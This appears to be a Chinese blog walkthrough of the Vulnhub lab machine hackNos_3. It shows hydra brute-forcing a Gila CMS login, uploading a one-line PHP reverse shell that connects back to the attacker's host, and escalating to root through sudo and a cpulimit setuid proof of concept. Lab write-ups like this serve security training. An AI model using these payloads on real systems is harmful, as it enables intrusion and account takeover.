---
layout: post
title: "Os hackNos_3 walkthrough"
date: 2021-06-28
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP               |
| ------------- | ---------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89`  |
| OS-hackNos-3  | `192.168.36.226` |

### 扫描端口和版本信息

`nmap -A 192.168.36.226`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 06:17 UTC
Nmap scan report for 192.168.36.226
Host is up (0.014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WebSec
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

输出结果清晰了然，只开启了**22**、**80**端口，并且根据主页面中的这条*You need extra **WebSec***提示信息，在*/websec*目录下看到网站内容。

使用*whatweb*工具收集信息，知道网站使用的是**Gila CMS**，下一步我们应该确定该CMS的版本，不过这比较困难(试过许多，但是找不到😢)

```shell
┌──(root💀kali)-[~]
└─# whatweb http://192.168.36.226/websec
http://192.168.36.226/websec/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@hacknos.com,your-email@your-domain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.36.226], JQuery, MetaGenerator[Gila CMS], Script
```

之后只能试试暴力破解登录密码，不过在*http://192.168.36.226/websec/admin/*登录页面中发现登录名使用的是邮件地址，因此可以确定该地址是主页面中的*contact@hacknos.com*，那么我们只需要爆破密码即可。

这里，我们可以使用*cewl*工具来生成密码文件：` cewl http://192.168.36.226/websec/ -w cewl_gila.txt`，而不必使用很大的*rockyou.txt*密码文件。接下来就使用*hydra*工具进行密码爆破。

> *hydra*工具使用方法：`hydra -L <用户名列表> -P <密码列表> <IP地址> <表单参数> <登录失败消息>`

```shell
┌──(root💀kali)-[~]
└─# hydra -l contact@hacknos.com -P cewl_gila.txt 192.168.36.226 http-post-form "/websec/admin:username=^USER^&password=^PASS^:Wrong email or password"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-28 08:00:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 53 login tries (l:1/p:53), ~4 tries per task
[DATA] attacking http-post-form://192.168.36.226:80/websec/admin:username=^USER^&password=^PASS^:Wrong email or password
[80][http-post-form] host: 192.168.36.226   login: contact@hacknos.com   password: Securityx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-28 08:00:37
```

至此我们得到了用户名和密码：`contact@hacknos.com:Securityx`，使用该账户和密码登录到后台，发现该CMS的版本号是**1.10.9**。之后在*searchsploit*搜索结果中发现该版本存在LFI漏洞，该漏洞点存在于*/admin/fm/?f=../../*中。通过阅读开发文档可以知道该路径*/admin/fm*是进行文件管理操作，在进行上传操作后文件保存在*/assets/*下，不过在上传具有反向shell的PHP文件前，需要更改*.htaccess*配置，在这里直接删除即可。

```php
<?php $sock=fsockopen("192.168.36.89",6677);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock),$pipes);?>
```

### Getshell

```shell
┌──(root💀kali)-[~]
└─# nc -lvp 6677
listening on [any] 6677 ...
192.168.36.226: inverse host lookup failed: Unknown host
connect to [192.168.36.89] from (UNKNOWN) [192.168.36.226] 59954
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
getshell.php
gila-logo.png
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@hacknos:/var/www/html/websec/assets$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

在查看该账户具备SUID权限命令时，返回中的信息提示需要进行查找，并且不太容易。

```shell
www-data@hacknos:/var/www/html/websec/assets$ sudo -l
sudo -l
Matching Defaults entries for www-data on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on hacknos:
    (www-data) NOPASSWD: /not/easy/What/are/you/looking
```

不过在此之前，可以在*/home/blackdevil/*目录下得到第一个flag：

```shell
www-data@hacknos:/home/blackdevil$ cat user.txt
cat user.txt
bae11ce4f67af91fa58576c1da2aad4b
```

经过许久查找，在*/var/local/*目录下找到一个数据库文件*database*，将其中的数据经过[解密](https://spammimic.com/spreadsheet.php?action=decode
)得到一串字符：`Security@x@`。之后经过尝试知道该字符串是*blackdevil*账户的密码。

### 提权

切换到*blackdevil*账户后，发现该账户具备sudo权限，后续步骤就简单了。

```shell
blackdevil@hacknos:~$ sudo -l
sudo -l
[sudo] password for blackdevil: Security@x@

Matching Defaults entries for blackdevil on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User blackdevil may run the following commands on hacknos:
    (ALL : ALL) ALL
blackdevil@hacknos:~$ sudo passwd root
sudo passwd root
New password: toor

Retype new password: toor

passwd: password updated successfully
blackdevil@hacknos:~$ su root
su root
Password: toor

root@hacknos:/home/blackdevil# cd /root
cd /root
root@hacknos:~# ls
ls
root.txt  snap
root@hacknos:~# cat root.txt
cat root.txt
########    #####     #####   ########         ########
##     ##  ##   ##   ##   ##     ##            ##     ##
##     ## ##     ## ##     ##    ##            ##     ##
########  ##     ## ##     ##    ##            ########
##   ##   ##     ## ##     ##    ##            ##   ##
##    ##   ##   ##   ##   ##     ##            ##    ##
##     ##   #####     #####      ##    ####### ##     ##


MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut
```

### 总结

1. 在进行密码爆破前，使用的密码文件可以先用*cewl*工具生成，不行就使用*rockyou.txt*文件作为密码文件

2. 在提权操作中，另一种操作就是利用**cpulimit**进行提权：

   1. Ubuntu编译PoC

      ```c
      #include<stdio.h>
      #include<unistd.h>
      #include<sys/types.h>
      
      int main()
      {
        setuid(0);
        setgid(0);
        system("/bin/bash");
        return 0;
      }
      // gcc poc.c -o poc
      // chmod 777 ./poc
      ```

   2. 执行PoC

      ```shell
      www-data@hacknos:/tmp$ cpulimit -l 100 -f ./poc
      ```

      